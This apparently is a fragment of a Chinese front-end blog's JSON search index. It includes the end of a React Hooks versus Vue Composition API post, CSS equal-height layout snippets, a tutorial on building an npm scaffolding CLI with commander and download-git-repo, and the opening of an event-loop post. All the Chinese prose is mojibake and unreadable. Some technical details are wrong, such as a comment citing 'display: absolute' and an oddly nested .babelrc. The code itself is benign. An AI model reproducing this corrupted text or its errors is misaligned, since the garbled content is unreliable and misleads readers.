å¯å‘å°†å…¶è°ƒæ•´ä¸ºé€‚ç”¨äºè‡ªå·±æ¡†æ¶çš„æ–¹å¼ï¼Œè¿™ä¹Ÿæˆä¸ºè¿™äº›ä¸åŒçš„æŠ€æœ¯å¦‚ä½•æ‹¥æŠ±å˜åŒ–ä¸”åˆ†äº«çµæ„Ÿå’Œè§£å†³æ–¹æ¡ˆçš„æˆåŠŸæ¡ˆä¾‹\nå‚è€ƒ Composition API RFC React hooks Comparing React Hooks with Vue Composition API æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/react-hooks-compare-vue-composition-api/","summary":"\u003cp\u003eç›®å½• åœºæ™¯ hook çš„æ—¶ä»£æ„ä¹‰ React Hooks Vue Composition API å·®åˆ« æ€»ç»“ åœºæ™¯ å…ˆç†è§£\u0026hellip;\u003c/p\u003e","title":"å¯¹æ¯” React Hooks å’Œ Vue Composition API"},{"content":"é¡¹ç›®å¼€å‘ä¸­ï¼Œç»å¸¸é‡åˆ°é¡µé¢å¸ƒå±€å’Œæ ·å¼çš„ä¸€äº›é—®é¢˜ï¼Œæœ€è¿‘åšäº†ä¸€äº›æ¢³ç†\u0026hellip;\nä¸€ã€CSS 1. å·¦å³divå…ƒç´ è‡ªé€‚åº”ç­‰é«˜ é€šå¸¸æœ‰ä»¥ä¸‹4ç§æ–¹å¼: table-cellã€CSS3ç›’æ¨¡å‹ã€ç›¸å¯¹å¸ƒå±€å’Œfloat\nåŸºç¡€ä»£ç  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;demo\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;wrap\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;item left\u0026#34;\u0026gt;111\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;item right\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æ–¹å¼1: table-cell /* æ­¤ç§å†™æ³•å…³é”®ç‚¹: 1. itemè®¾ç½®display table-cell table-cellå­˜åœ¨é—®é¢˜: 1. table-cellæ˜¯æŠŠå…ƒç´ å½“åštableçš„tdå¤„ç†, æ‰€ä»¥è®¾ç½®ä¹‹å.leftè®¾ç½®çš„min-heightä¸èµ·ä½œç”¨,åªèƒ½é å…ƒç´ æœ¬èº«æ’‘èµ·æ•´ä¸ªé«˜åº¦ 2. table-cellæœ‰å…¼å®¹é—®é¢˜, ie8ä»¥ä¸Š */ \u0026lt;style\u0026gt; .wrap { width: 1200px; } .item { width: 300px; display: table-cell; } .right { width: 800px; background-color: #6accd5; } .left { padding-top: 20px; /*min-height: 200px;*/ background-color: #e17b4e; } \u0026lt;/style\u0026gt; æ–¹å¼2: CSS3ç›’æ¨¡å‹ /* æ­¤ç§å†™æ³•å…³é”®ç‚¹: 1. çˆ¶å…ƒç´ .wrapè®¾ç½®display -webkit-box */ \u0026lt;style\u0026gt; .wrap { display: -webkit-box; width: 1200px; } .left{ width: 200px; min-height: 200px; background-color: #e17b4e; } .right { width: 800px; padding: 10px; background-color: #6accd5; } \u0026lt;/style\u0026gt; æ–¹å¼3: ç›¸å¯¹å¸ƒå±€ â€”â€” ç¬¬ä¸€ç§è¦é‡ç‚¹ç†è§£çš„æ–¹æ³• /* æ­¤ç§å†™æ³•çš„å…³é”®ç‚¹æœ‰ä¸‰: 1. wrap çš„positioné¡»è®¾ä¸ºabsolute/relative, ä¸ºäº†è®©rightçš„ç›¸å¯¹å¸ƒå±€å¯¹è±¡ä¸ºçˆ¶class wrap 2. right è®¾ç½® absolute, top \u0026amp; bottom è®¾ç½®ä¸º0, æ’‘èµ·çˆ¶å…ƒç´ height, rightä¸º0, é å³ä¾§ 3. æ•´ä¸ªå¸ƒå±€æœ€å°heightä¸º.left min-height, éšç€.leftå†…å…ƒç´ å¢åŠ , å·¦å³ç­‰é«˜ */ \u0026lt;style\u0026gt; .wrap { width: 1200px; position: absolute; /*position: relative;*/ } .item { width: 300px; display: inline-block; } .right { width: 800px; position: absolute; top: 0; bottom: 0; right: 0; background-color: #6accd5; } .left { min-height: 200px; background-color: #e17b4e; } \u0026lt;/style\u0026gt; æ–¹å¼4: float â€”â€” ç¬¬äºŒç§è¦é‡ç‚¹ç†è§£çš„æ–¹æ³• /* æ­¤ç§å†™æ³•çš„å…³é”®ç‚¹æœ‰ä¸‰ï¼š 1. .wrapè®¾ç½®display: absolute ç»§æ‰¿çˆ¶å…ƒç´ (body)ï¼Œ åœ¨å­å…ƒç´ .rightè®¾ç½®absoluteæ—¶ï¼Œç›¸å¯¹çš„å…ƒç´ æ˜¯.wrapè€Œä¸æ˜¯æ•´ä¸ªbody 2. .wrapå­å…ƒç´ è®¾ç½®float, æœ¬èº«å˜æˆinlineå…ƒç´ , æ²¡æœ‰height, é€šè¿‡è®¾ç½®display: absoluteæˆ–è€…overflow: hidden, å¯ä»¥è®©.wrapé‡æ–°å˜æˆblockå…ƒç´  3. å­å…ƒç´ heightè®¾ä¸º100% æ³¨ï¼šç›¸å¯¹å®šä½å’Œoverflow: hiddenæ˜¯æ€ä¹ˆå®ç°å…ƒç´ blockçš„ï¼ŒæŸ¥è¯¢å‚è€ƒBFCå’ŒIFC */ \u0026lt;style\u0026gt; .wrap { width: 1200px; position:absolute; /*overflow: hidden;*/ background-color: rgba(0, 0, 0, 0.2); } .left { float: left; width: 50%; background-color: #e17b4e; height: 100%; min-height: 300px; } .right { float: left; width: 30%; height: 100%; position: absolute; left: 55%; background-color: #6accd5; } .right:after{ clear: both; } \u0026lt;/style\u0026gt; åã€å¸¸è§é—®é¢˜ 1. WARN [vite:css] xxx value has mixed support, consider using xxx instead è¯¦ç»†é”™è¯¯æç¤ºä¿¡æ¯:\nlianpf@lianpf-PC:~/despository-z/framework/wenhao-testapp$ yarn serve yarn run v1.22.22 $ zmi serve [10:53:49.866] INFO (28799): æ­£åœ¨åŠ è½½presets: h5 âœ Local: http://localhost:5173/ 10:53:50 âœ Network: http://10.10.138.3:5173/ 10:53:50 WARN [vite:css] end value has mixed support, consider using flex-end instead è§£æ³•ï¼š å¦‚æœæ‚¨ä½¿ç”¨(S)CSSæˆ–SASSï¼Œåˆ™å¿…é¡»åˆ†åˆ«ç¼–å†™flex-startæˆ–flex-endè€Œä¸æ˜¯startæˆ–end\njustify-content: flex-end; align-items: flex-end; å‚è€ƒ start value has mixed support, consider using flex-start instead\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/css-codefragment/","summary":"é¡¹ç›®å¼€å‘ä¸­ï¼Œç»å¸¸é‡åˆ°é¡µé¢å¸ƒå±€å’Œæ ·å¼çš„ä¸€äº›é—®é¢˜ï¼Œæœ€è¿‘åšäº†ä¸€äº›æ¢³","title":"ä»£ç ç‰‡æ®µ: html/css/less/sass"},{"content":"æœ¬ç¯‡æ˜¯å‰ç«¯å·¥ç¨‹åŒ–ä¹‹ä¾æ‰˜æ¨¡æ¿æ­å»ºä¼ä¸šçº§è„šæ‰‹æ¶(cli)ã€‚é€šè¿‡è„šæ‰‹æ¶ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿåˆå§‹åŒ–ä¸€ä¸ªé¡¹ç›®ï¼Œæ— éœ€è‡ªå·±ä»é›¶å¼€å§‹ä¸€æ­¥æ­¥\u0026hellip;\nä¸€ã€èƒŒæ™¯ 1.ä¸ºä»€ä¹ˆ é€šè¿‡è„šæ‰‹æ¶ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿåˆå§‹åŒ–ä¸€ä¸ªé¡¹ç›®ï¼Œæ— éœ€è‡ªå·±ä»é›¶å¼€å§‹ä¸€æ­¥æ­¥é…ç½®ï¼Œæœ‰æ•ˆæå‡å¼€å‘ä½“éªŒã€‚\nå½“ç„¶ï¼Œç¤¾åŒºå·²ç»è´¡çŒ®äº†vue-cliã€create-react-appã€react-native-cliç­‰éå¸¸ä¼˜ç§€çš„è„šæ‰‹æ¶ï¼Œ\nä½†æ˜¯ï¼Œè¿™äº›è„šæ‰‹æ¶æœªå¿…å®Œå…¨ç¬¦åˆæˆ‘ä»¬çš„å®é™…åº”ç”¨ï¼Œç‰¹åˆ«æ˜¯ä½œä¸ºä¼ä¸šé€šç”¨è„šæ‰‹æ¶è€Œè¨€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å®šåˆ¶è‡ªå·±çš„è„šæ‰‹æ¶ï¼Œæ¥æå‡å¼€å‘æ•ˆç‡ã€‚\n2.è„šæ‰‹æ¶çš„ä½œç”¨ å‡å°‘é‡å¤æ€§å·¥ä½œï¼šä¸éœ€è¦å¤åˆ¶å…¶ä»–é¡¹ç›®å†åˆ é™¤æ— å…³ä»£ç ï¼Œæˆ–è€…ä»é›¶åˆ›å»ºä¸€ä¸ªé¡¹ç›®å’Œæ–‡ä»¶ã€‚ å¤šå¥—æ¨¡æ¿ï¼šå¯ä»¥æ ¹æ®äº¤äº’åŠ¨æ€ç”Ÿæˆé¡¹ç›®ç»“æ„å’Œé…ç½®æ–‡ä»¶ã€‚ åä½œï¼šå¤šäººåä½œæ›´ä¸ºæ–¹ä¾¿ï¼Œä¸éœ€è¦æŠŠæ–‡ä»¶ä¼ æ¥ä¼ å»ã€‚ æœ¬é¡¹ç›®å®Œæ•´ä»£ç åœ°å€ï¼Œåœ¨æ–‡ç« æœ«å°¾ã€‚\näºŒã€æä¾›çš„åŠŸèƒ½ æ˜ç¡®è„šæ‰‹æ¶ï¼ˆ@lianpf/create-app-cliï¼‰éœ€è¦æä¾›çš„åŠŸèƒ½ï¼š\nca init \u0026lt;template-name\u0026gt; \u0026lt;project-name\u0026gt; æ ¹æ®è¿œç¨‹æ¨¡æ¿ï¼Œåˆå§‹åŒ–ä¸€ä¸ªé¡¹ç›®(è¿œç¨‹æ¨¡æ¿å¯é…ç½®) ca config set \u0026lt;template-name\u0026gt; \u0026lt;repository\u0026gt; è®¾ç½®æ¨¡æ¿ä¿¡æ¯ï¼ˆæš‚æœªå®ç°ï¼‰ ca config get templates æŸ¥çœ‹æ¨¡æ¿é…ç½®ä¿¡æ¯ ca cfg get templates åŒä¸Š ca -v æŸ¥çœ‹å½“å‰ç‰ˆæœ¬å· ca -h å¸®åŠ© å¦‚æœæœ‰å…¶ä»–éœ€æ±‚ï¼Œå¯æ ¹æ®éœ€æ±‚ï¼Œè‡ªè¡Œæ‹“å±•commander\nä¸‰ã€é…ç½®æ­å»ºcli 1.ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“ @babel/cliã€@babel/coreå’Œ@babel/preset-env: è¯­æ³•è½¬æ¢ commander: å‘½ä»¤è¡Œå·¥å…· download-git-repo: ç”¨æ¥ä¸‹è½½è¿œç¨‹æ¨¡æ¿ ini: é…ç½®é¡¹æ ¼å¼è½¬æ¢ ã€æš‚æ—¶æ²¡ç”¨ã€ä¸€èˆ¬ç”¨äºç‰©ç†æœºæœ¬åœ°é…ç½®é¡¹ inquirer: äº¤äº’å¼å‘½ä»¤è¡Œå·¥å…· ora: æ˜¾ç¤ºnodeå‘½ä»¤ç¯å¢ƒloadingåŠ¨ç”» chalk: ä¿®æ”¹æ§åˆ¶å°è¾“å‡ºå†…å®¹æ ·å¼ log-symbols: æ˜¾ç¤ºå‡ºâˆšæˆ–Ã—ç­‰çš„å›¾æ ‡ ascii-table: ä»¥è¡¨æ ¼å½¢å¼å±•ç¤ºæ•°æ®ï¼Œæ¯”å¦‚ï¼šæ¨¡æ¿åˆ—è¡¨ å…³äºä»¥ä¸Šç¬¬ä¸‰æ–¹packageçš„ä»‹ç»ï¼Œå¯ç›´æ¥npm.orgä¸ŠæŸ¥çœ‹ç›¸åº”çš„è¯´æ˜\n2.æ­å»ºcli 2.1 åˆå§‹åŒ–é¡¹ç›® åˆ›å»ºä¸€ä¸ªç©ºé¡¹ç›®(create-app-cli)\ncreate-app-cli $ npm init // é¡¹ç›®åˆå§‹åŒ– å®‰è£…ä¾èµ–\ncreate-app-cli $ npm install @babel/cli @babel/core @babel/preset-env chalk commander download-git-repo ini inquirer log-symbols ora -D ç›®å½•ç»“æ„\n. â”œâ”€â”€ bin â”‚ â””â”€â”€ www // å¯æ‰§è¡Œæ–‡ä»¶ â”œâ”€â”€ lib â”œâ”€â”€ ... // ç”Ÿæˆæ–‡ä»¶ â”œâ”€â”€ src â”‚ â”œâ”€â”€ config.js // ç®¡ç† @lianpf/create-app-cli é…ç½®æ–‡ä»¶ â”‚ â”œâ”€â”€ index.js // ä¸»æµç¨‹å…¥å£æ–‡ä»¶ â”‚ â”œâ”€â”€ init.js // init command â”‚ â”œâ”€â”€ main.js // å…¥å£æ–‡ä»¶ â”‚ â””â”€â”€ utils â”‚ â”œâ”€â”€ constants.js // å®šä¹‰å¸¸é‡ â”‚ â”œâ”€â”€ download.js // æ¨¡æ¿è¿œç¨‹ä»“åº“ä¸‹è½½ â”‚ â””â”€â”€ rc.js // é…ç½®æ–‡ä»¶ â”œâ”€â”€ templates.json // æ¨¡æ¿é…ç½®æ–‡ä»¶ â”œâ”€â”€ .babelrc // babelé…ç½®æ–‡ä»¶ â”œâ”€â”€ package.json â””â”€â”€ README.md babelé…ç½®ï¼šå¼€å‘ä½¿ç”¨äº†ES6è¯­æ³•ï¼Œä½¿ç”¨ babel è¿›è¡Œè½¬ä¹‰ .bablerc\n{ \u0026#34;presets\u0026#34;: [ [ \u0026#34;@babel/preset-env\u0026#34;, { \u0026#34;targets\u0026#34;: { \u0026#34;node\u0026#34;: \u0026#34;current\u0026#34; } }, \u0026#34;@babel/preset-react\u0026#34; // react è¯­æ³• ] ], \u0026#34;plugins\u0026#34;: [ \u0026#34;transform-class-properties\u0026#34;, \u0026#34;transform-decorators\u0026#34;, \u0026#34;transform-react-constant-elements\u0026#34;, \u0026#34;transform-react-inline-elements\u0026#34; ] } 2.2 @lianpf/create-app-cliå¼€å‘ç¯å¢ƒæ­å»º 2.2.1 è„šæ‰‹æ¶å¼€å‘ï¼šå¯åŠ¨å‘½ä»¤é…ç½® node.jså†…ç½®äº†å¯¹å‘½ä»¤è¡Œæ“ä½œçš„æ”¯æŒï¼Œpackage.jsonä¸­çš„bin å­—æ®µå¯ä»¥å®šä¹‰å‘½ä»¤åå’Œå…³è”çš„æ‰§è¡Œæ–‡ä»¶ã€‚åœ¨package.jsonä¸­æ·»åŠ  binå­—æ®µ\npackage.json\n{ \u0026#34;name\u0026#34;: \u0026#34;@lianpf/create-app-cli\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;0.2.1\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;A cli to help create a project\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;bin\u0026#34;: { \u0026#34;ca\u0026#34;: \u0026#34;./bin/www\u0026#34; }, \u0026#34;scripts\u0026#34;: { \u0026#34;compile\u0026#34;: \u0026#34;babel src -d lib\u0026#34;, \u0026#34;watch\u0026#34;: \u0026#34;npm run compile -- --watch\u0026#34; } } www æ–‡ä»¶\nè¡Œé¦–åŠ å…¥ä¸€è¡Œ#!/usr/bin/env nodeæŒ‡å®šå½“å‰è„šæœ¬ç”±node.jsè¿›è¡Œè§£æ\n#! /usr/bin/env node require(\u0026#39;../lib/main.js\u0026#39;); 2.2.2 è„šæ‰‹æ¶æµ‹è¯•ï¼šé“¾æ¥åˆ°å…¨å±€ç¯å¢ƒ å¼€å‘è¿‡ç¨‹ä¸­ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œåœ¨å½“å‰çš„create-app-cliç›®å½•ä¸‹æ‰§è¡Œ npm linkï¼Œå°†caå‘½ä»¤é“¾æ¥åˆ°å…¨å±€ç¯å¢ƒ\n2.2.3 è„šæ‰‹æ¶å¼€å‘ï¼šå¯åŠ¨é¡¹ç›® create-app-cli $ npm run watch 2.3 @lianpf/create-app-cliå‘½ä»¤è¡Œå¤„ç† åˆ©ç”¨commanderæ¥å¤„ç†å‘½ä»¤è¡Œ\n/create-app-cli/src/main.js\nimport program from \u0026#39;commander\u0026#39;; import { VERSION, make_success, make_fail } from \u0026#39;./utils/constants\u0026#39;; import apply from \u0026#39;./index\u0026#39;; /** * ca commands * - config * - init * - v * - h */ let actionMap = { // init å‘½ä»¤é…ç½® init: { ... }, // config å‘½ä»¤é…ç½® config: { ... } } // éå†é¢„è®¾å‘½ä»¤ï¼Œè¿›è¡Œå¤„ç†é…ç½® Object.keys(actionMap).forEach((action) =\u0026gt; { program.command(action) .description(actionMap[action].description) .alias(actionMap[action].alias) .action(() =\u0026gt; { switch (action) { case \u0026#39;config\u0026#39;: apply(action, ...process.argv.slice(3)); break; case \u0026#39;init\u0026#39;: apply(action, ...process.argv.slice(3)); break; default: break; } }); }); function help() { // -h å‚æ•°æ˜¯ï¼Œéå†åˆ—å‡ºæ‰€æœ‰å‘½ä»¤ ... } program.usage(\u0026#39;\u0026lt;command\u0026gt; [options]\u0026#39;); program.on(\u0026#39;-h\u0026#39;, help); program.on(\u0026#39;--help\u0026#39;, help); program.version(VERSION, \u0026#39;-v, --version\u0026#39;).parse(process.argv); // ca ä¸å¸¦å‚æ•°æ—¶ if (!process.argv.slice(2).length) { program.outputHelp(make_success); } 2.4 @lianpf/create-app-cliä¸‹è½½æ¨¡æ¿ download-git-repoæ”¯æŒä»Githubã€Gitlabä¸‹è½½è¿œç¨‹ä»“åº“åˆ°æœ¬åœ°\n/create-app-cli/src/util/download.js\nimport downloadGit from \u0026#39;download-git-repo\u0026#39;; import { templateConfig, hasTemplate } from \u0026#39;./constants\u0026#39;; export const downloadLocal = async (templateName, projectName) =\u0026gt; { const _hasTemplate = hasTemplate(templateName) let api = \u0026#39;\u0026#39; // åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¨¡æ¿ if (_hasTemplate) { // è·å– æ¨¡æ¿ä¸‹è½½åœ°å€ api = `${templateConfig[templateName].type}:${templateConfig[templateName].user}/${templateConfig[templateName].repository}#${templateConfig[templateName].branch}`; } return new Promise((resolve, reject) =\u0026gt; { // projectName ä¸ºä¸‹è½½åˆ°çš„æœ¬åœ°ç›®å½• downloadGit(api, projectName, { clone: true }, (err) =\u0026gt; { if (err) { reject(err); } else { resolve(); } }); }); } constants.jsè·å–templateé…ç½®\n/create-app-cli/src/util/constants.js\n... import templates from \u0026#39;../../templates.json\u0026#39; ... // template config export const templateConfig = templates // åˆ¤æ–­æ˜¯å¦å­˜åœ¨å½“å‰æ¨¡æ¿ export const hasTemplate = (templateName) =\u0026gt; { return Object.keys(templateConfig).indexOf(templateName) \u0026gt; -1 } ... é™æ€templateé…ç½®\n/create-app-cli/template.json\n{ \u0026#34;react-template\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;https://github.com\u0026#34;, \u0026#34;user\u0026#34;: \u0026#34;xxx\u0026#34;, \u0026#34;repository\u0026#34;: \u0026#34;xxx\u0026#34;, \u0026#34;branch\u0026#34;: \u0026#34;master\u0026#34;, \u0026#34;templateName\u0026#34;: \u0026#34;react-template\u0026#34;, \u0026#34;keyWords\u0026#34;: \u0026#34;reactã€webpack\u0026#34; }, ... } æ³¨æ„ï¼Œè¿™é‡Œæ²¡æœ‰å®ç°ca config set \u0026lt;template-name\u0026gt; \u0026lt;repository\u0026gt;è®¾ç½®æ¨¡æ¿å‘½ä»¤ï¼Œä¸”ä¼ä¸šçº§è„šæ‰‹æ¶å¯¹åº”æ¨¡æ¿ç›¸å¯¹å›ºå®šï¼Œæ•…æˆ‘ä»¬å°†æ¨¡æ¿é¢„å…ˆå†…ç½®åˆ°template.jsonæ–‡ä»¶ä¸­\n2.5 @lianpf/create-app-cliäº¤äº’å¼å‘½ä»¤å’Œç¾åŒ– 2.5.1 å‘½ä»¤è¡Œäº¤äº’ ç”¨æˆ·æ‰§è¡Œinitå‘½ä»¤åï¼Œå‘ç”¨æˆ·æå‡ºé—®é¢˜ï¼Œæ¥æ”¶ç”¨æˆ·çš„è¾“å…¥å¹¶ä½œå‡ºç›¸åº”çš„å¤„ç†ã€‚å‘½ä»¤è¡Œäº¤äº’åˆ©ç”¨inquirerå®ç°:\n/create-app-cli/src/init.js\ninquirer.prompt([ { name: \u0026#39;description\u0026#39;, message: \u0026#39;Please enter the project description: \u0026#39; }, { name: \u0026#39;author\u0026#39;, message: \u0026#39;Please enter the author name: \u0026#39; } ]).then((answer) =\u0026gt; { //... }); ç±»ä¼¼äºï¼šnpm initå‘½ä»¤æ‰§è¡Œåï¼Œé¡¹ç›®åˆå§‹åŒ–ï¼Œä¼šé—®è¯¢ä½ ä½œè€…ã€ç‰ˆæœ¬ä¿¡æ¯ã€æè¿°ç­‰æ·»åŠ åˆ°package.jsoné…ç½®æ–‡ä»¶çš„äº¤äº’æ“ä½œã€‚\n2.5.2 è§†è§‰ç¾åŒ– åœ¨ä¸Šä¸€æ­¥ï¼Œç”¨æˆ·è¾“å…¥åï¼Œå¼€å§‹ä¸‹è½½æ¨¡æ¿ï¼Œæ­¤æ—¶ä½¿ç”¨oraæç¤ºç”¨æˆ·æ­£åœ¨ä¸‹è½½æ¨¡æ¿ï¼Œä»¥åŠä¸‹è½½ç»“æŸåç»™å‡ºç›¸åº”æç¤ºã€‚\n/create-app-cli/src/init.js\n... import ora from \u0026#39;ora\u0026#39;; ... let loading = ora(\u0026#39;downloading template ...\u0026#39;); loading.start(); //download loading.succeed(); //æˆ– loading.fail(); 2.6 @lianpf/create-app-cliè·å–æ¨¡æ¿é…ç½® configé…ç½®æ”¯æŒä½¿ç”¨å…¶å®ƒä»“åº“ä½œä¸ºæ¨¡æ¿ã€‚è¿™æ ·ä½¿ç”¨è€…å¯ä»¥è‡ªç”±é€‰æ‹©ä¸‹è½½ç›®æ ‡\n/create-app-cli/src/config.js\nimport { get } from \u0026#39;./utils/rc\u0026#39;; import { make_success, make_fail, make_warn } from \u0026#39;./utils/constants\u0026#39;; let config = async (action, key) =\u0026gt; { switch (action) { case \u0026#39;get\u0026#39;: if (key) { let result = await get(key); if (result.code === 0) { console.log(make_success(result.message)); } else { console.log(make_fail(result.message)); } } else { console.log(make_warn(\u0026#39;Command does not exist!\u0026#39;)); } break; // set æ¨¡æ¿å‘½ä»¤æš‚æœªå®ç°ï¼Œéœ€é€šè¿‡ template.json é…ç½® // case \u0026#39;set\u0026#39;: // set(key, value); // break; // case \u0026#39;remove\u0026#39;: // remove(key); // break; default: console.log(make_warn(\u0026#39;Command does not exist!\u0026#39;)); break; } } module.exports = config; rc.jsè´Ÿè´£å¯¹æœ¬åœ°ç‰©ç†æœºã€æ¨¡æ¿é…ç½®æ–‡ä»¶ã€çš„å¢åˆ æ”¹æŸ¥ï¼Œè¿™é‡Œæ”¹é€ ä¸ºå¯¹è„šæ‰‹æ¶æ¨¡æ¿é…ç½®æ–‡ä»¶template.jsonçš„æŸ¥è¯¢\n/create-app-cli/src/util/rc.js\nimport { configCommand, make_success, make_warn, templateConfig } from \u0026#39;./constants\u0026#39;; import AsciiTable from \u0026#39;ascii-table\u0026#39; // constants é…ç½®æ–‡ä»¶ export const get = async (key) =\u0026gt; { ... if (opts.indexOf(key) !== -1) { switch (key) { case \u0026#39;templates\u0026#39;: // codeã€messageã€dataå¤„ç† ... break; default: ... break; } } ... console.log(make_success(templateTable.toString())) return { code, data: {}, message }; } å››ã€å‘å¸ƒcli npm publishè„šæ‰‹æ¶å‘å¸ƒã€‚ å…¶å®ƒç”¨æˆ·å¯é€šè¿‡npm install @lianpf/create-app-cli -gå…¨å±€å®‰è£…ï¼Œå³å¯ä½¿ç”¨caå‘½ä»¤ã€‚ ä»“åº“æºç  è°¢è°¢å„ä½èŠ±è´¹å®è´µçš„æ—¶é—´é˜…è¯»æœ¬æ–‡ï¼Œä»¥ä¸‹æ˜¯æºç ä»“åº“åœ°å€ï¼Œå¦‚æœæœ¬æ–‡ç»™äº†æ‚¨ä¸€ç‚¹å¸®åŠ©æˆ–è€…æ˜¯å¯å‘ï¼Œè¯·åŠ¨åŠ¨å°æ‰‹ç‚¹è¿›Githubä»“åº“ï¼Œä¸è¦åå•¬ä½ çš„Starï¼Œæ‚¨çš„è‚¯å®šæ˜¯æˆ‘å‰è¿›çš„æœ€å¤§åŠ¨åŠ›\ncreate-app-cli å‚è€ƒ [1] npmä¾èµ–æ–‡æ¡£ [2] è„šæ‰‹æ¶æ­å»º.åˆ˜å°å¤•.æ˜é‡‘ [3] eos-cliæºç  æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/25.%E6%90%AD%E5%BB%BA%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%84%9A%E6%89%8B%E6%9E%B6/","summary":"\u003cp\u003eæœ¬ç¯‡æ˜¯å‰ç«¯å·¥ç¨‹åŒ–ä¹‹ä¾æ‰˜æ¨¡æ¿æ­å»ºä¼ä¸šçº§è„šæ‰‹æ¶(cli)ã€‚é€šè¿‡è„šæ‰‹æ¶ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿåˆå§‹åŒ–ä¸€ä¸ªé¡¹ç›®ï¼Œæ— éœ€è‡ªå·±ä»é›¶å¼€å§‹ä¸€æ­¥æ­¥\u0026hellip;\u003c/p\u003e","title":"å·¥å…·\u0026å·¥ç¨‹åŒ–ï¼šä¾æ‰˜æ¨¡æ¿æ­å»ºä¼ä¸šçº§è„šæ‰‹æ¶(cli)"},{"content":"ä¸€ã€èƒŒæ™¯ ä½œä¸ºä¸€æšâ€œå‰ç«¯æ‰“å­—å‘˜â€ï¼Œ æ— è®ºæ˜¯æ–°æ‰‹è¿˜æ˜¯è€é¸Ÿï¼Œéƒ½ä¼šé‡åˆ°ä¸€ä¸ªä»¤äººæ·±çœçš„é—®é¢˜ï¼Œæ—¢ç„¶js æ˜¯å•çº¿ç¨‹æ‰§è¡Œçš„ï¼Œæ˜¯æŒ‰ç…§è¯­å¥å‡ºç°çš„é¡ºåºæ‰§è¡Œçš„ï¼Œé‚£ä¹ˆå¼‚æ­¥çš„ä»£ç  js æ˜¯æ€ä¹ˆå¤„ç†çš„å‘¢ï¼Ÿä¸‹é¢çš„ä»£ç æ˜¯å¦‚ä½•è¿›è¡Œè¾“å‡ºçš„ï¼Ÿ\nconsole.log(1); setTimeout(function() { console.log(2); }, 0); new Promise(function(resolve) { console.log(3); resolve(Date.now()); }).then(function() { console.log(4); }); console.log(5); setTimeout(function() { new Promise(function(resolve) { console.log(6); resolve(Date.now()); }).then(function() { console.log(7); }); }, 0); å¥½äº†ï¼Œå°ä¼™å­ä»¬å¯ä»¥å°½æƒ…å‘æŒ¥ä½ çš„æƒ³è±¡åŠ›ï¼Œå¦‚æœä½ çš„ç­”æ¡ˆä¸æ˜¯â€1, 3, 5, 4, 2, 6, 7â€œï¼Œé‚£ä½ å°±è¦è®¤è®¤çœŸçœŸæ¥ç€å¾€ä¸‹çœ‹äº†ã€‚ä»€ä¹ˆï¼Ÿä½ 